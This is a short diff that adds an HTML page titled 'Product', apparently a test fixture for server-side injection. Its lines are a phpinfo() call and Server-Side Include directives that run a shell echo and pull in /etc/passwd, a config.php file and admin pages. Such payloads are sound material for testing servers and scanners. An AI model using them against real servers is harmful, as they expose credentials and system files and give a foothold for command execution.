@@ -1,0 +1,12 @@
+<html>
+	<header>Product</header>
+<body>
+	<?php phpinfo();  ?>
+	Product
+***<!--#exec cmd="echo 'xxx''xxx'" -->***
++++<!--#include file="/etc/passwd" -->+++
+$$$<!--#include file="../config.php" -->$$$
+===<!--#include virtual="../system/startup.php" -->===
+---<!--#include virtual="../admin/index.php" -->---
+</body>
+</html>
